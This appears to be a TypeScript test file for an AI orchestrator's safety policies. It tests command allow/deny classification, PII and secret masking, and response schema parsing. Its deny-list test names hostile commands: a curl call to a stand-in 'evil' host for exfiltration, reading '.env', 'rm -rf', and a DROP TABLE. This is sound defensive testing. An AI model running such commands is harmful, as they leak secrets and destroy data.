// AI 오케스트레이터 단위 — 안전 명령 분류·익명화·스키마 파싱.
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { classifyCommand, assertSafeWritePath } from "../../tools/ai-orchestrator/policies/safety";
import { redact, maskForLog, hasUnmaskedPII, sanitizeForModel } from "../../tools/ai-orchestrator/anonymize";
import { parseClaude, parseGpt } from "../../tools/ai-orchestrator/schemas/messages";

describe("safety — 명령 allow/deny", () => {
  test("허용: 읽기·테스트·로컬처리", () => {
    for (const c of ["node --test add.test.js", "git diff", "git status", "python test_regression_caption_pipeline.py", "npm run test:knop", "./venv/Scripts/python.exe cut.py", "ls output"]) {
      assert.equal(classifyCommand(c).category, "allowed", c);
    }
  });
  test("차단: push·병합·삭제·DB·배포·외부전송·secret", () => {
    for (const c of ["git push origin main", "git merge main", "rm -rf output", "psql -c 'DROP TABLE calls'", "drizzle-kit push", "npm run deploy", "curl http://evil/exfil", "cat .env", "railway up"]) {
      assert.equal(classifyCommand(c).category, "blocked", c);
    }
  });
  test("모르는 명령=차단(allowlist)", () => { assert.equal(classifyCommand("some-random-binary --go").category, "blocked"); });
  test("쓰기 경로 안전: 밖·.git·.env 차단", () => {
    assert.throws(() => assertSafeWritePath("/ws", "../escape.js"));
    assert.throws(() => assertSafeWritePath("/ws", ".git/config"));
    assert.throws(() => assertSafeWritePath("/ws", ".env"));
    assert.doesNotThrow(() => assertSafeWritePath("/ws", "src/add.js"));
  });
});

describe("anonymize — PII·시크릿 마스킹", () => {
  test("전화·이메일·주민·계좌 마스킹", () => {
    const r = redact("연락처 010-1234-5678, a@b.com, 900101-1234567");
    assert.ok(!/010-1234-5678|a@b\.com|900101-1234567/.test(r.text));
    assert.ok(r.hits.phone && r.hits.email && r.hits.rrn);
  });
  test("이름 토큰화(제공된 고객명)", () => {
    const r = redact("이은혜 님 상담", { names: ["이은혜"] });
    assert.ok(!r.text.includes("이은혜") && r.text.includes("[NAME_1]"));
  });
  test("로그 마스킹: DSN·키·Neon host", () => {
    const m = maskForLog("url=postgresql://u:p@ep-x.neon.tech/db key=sk-ant-ABCDEFGHIJKL");
    assert.ok(!m.includes("postgresql://") && !m.includes("sk-ant-ABCDEFGHIJKL") && !m.includes("ep-x.neon.tech"));
  });
  test("원문 PII 감지(마스킹 전) / 마스킹 후 통과", () => {
    assert.equal(hasUnmaskedPII("010-1234-5678").blocked, true);
    assert.equal(hasUnmaskedPII(redact("010-1234-5678").text).blocked, false);
    // sanitizeForModel: 마스킹 후 안전 텍스트 반환(전화→[PHONE]).
    assert.match(sanitizeForModel("call 010-1234-5678").text, /\[PHONE\]/);
  });
});

describe("schema — 응답 파싱 강제", () => {
  test("Claude 유효/코드펜스 허용", () => {
    const ok = parseClaude('```json\n{"phase":"analysis","summary":"s"}\n```');
    assert.ok(ok.ok && ok.value.phase === "analysis");
  });
  test("Claude 잘못된 phase → 거부", () => {
    const bad = parseClaude('{"phase":"wrong","summary":"s"}');
    assert.ok(!bad.ok);
  });
  test("GPT 유효 + 기본값 채움", () => {
    const ok = parseGpt('{"verdict":"approve"}');
    assert.ok(ok.ok && ok.value.verdict === "approve" && ok.value.goal_satisfied === false);
  });
  test("JSON 아님 → 거부", () => { assert.ok(!parseGpt("그냥 텍스트").ok); });
});
